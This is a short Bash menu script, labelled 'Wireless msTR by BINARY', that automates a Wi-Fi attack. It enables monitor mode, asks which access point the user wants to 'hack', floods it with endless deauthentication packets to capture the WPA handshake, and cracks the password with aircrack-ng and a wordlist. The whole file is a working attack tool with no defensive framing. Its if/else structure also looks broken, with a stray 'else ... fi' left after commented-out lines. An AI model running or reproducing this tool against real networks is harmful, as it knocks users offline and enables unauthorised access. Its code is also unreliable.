#!/bin/bash


# clear the screen
tput clear

# Move cursor to screen location X,Y (top left is 0,0)
tput cup 3 15

# Set a foreground colour using ANSI escape
tput setaf 3
echo "Wireless msTR by BINARY"
tput sgr0

tput cup 5 17
# Set reverse video mode
tput rev
echo "M A I N - M E N U"
tput sgr0

tput cup 7 15
echo "1. Start Attacking"

tput cup 8 15
echo "2. Start Wireshark"

tput cup 9 15
echo "3. Stop Monitor Mood"

tput cup 10 15
echo "4. Quit"

tput cup 12 15
echo -n "Enter your choice [1-4] "
read choice

echo
echo
tput sgr0


if [[ $choice -eq 1 ]];then
    echo "Starting Monitor Mood"
    sudo airmon-ng start wlan0
    sudo airmon-ng
    echo
    echo
    tput rev
    echo "Press ctrl+C when you find your desired device"
    tput sgr0
    sudo airodump-ng wlan0mon
    echo -n "Which device u want to hack?"
    tput setaf 3
    echo -n "Please Enter the BSSID : "
    tput sgr0
    read bssid
    tput setaf 3
    echo -n "Channel Number : "
    tput sgr0
    read cnumber
    tput rev
    echo
    echo "Press ctrl+C when you capture the handshake"
    tput sgr0
    #sudo airodump-ng -w hack.$bssid -c $cnumber --bssid $bssid wlan0mon & xterm -hold -e sudo aireplay-ng --deauth 0 -a $bssid wlan0mon && exec -c
    sudo xterm -e sudo airodump-ng -w hack.$bssid -c $cnumber --bssid $bssid wlan0mon & sudo xterm -e sudo aireplay-ng --deauth 0 -a $bssid wlan0mon && exec -c
    
    echo
    echo "Do you want to crack the handshake? [Y/N]"

    #read handshake
    #if [[$handshake == Y]];then
    #sudo aircrack-ng hack$bssid-01.cap -w wordlist.txt
    sudo xterm -e sudo airmon-ng stop wlan0mon & sudo aircrack-ng hack$bssid-01.cap -w wordlist.txt

    
    else
    exit 0
    fi
    
elif [[ $choice -eq 2 ]];then
    wireshark 
elif [[ $choice -eq 3 ]];then
    echo "Quiting - Monitor Mood"
    sudo airmon-ng stop wlan0mon
else
    exit 0
fi
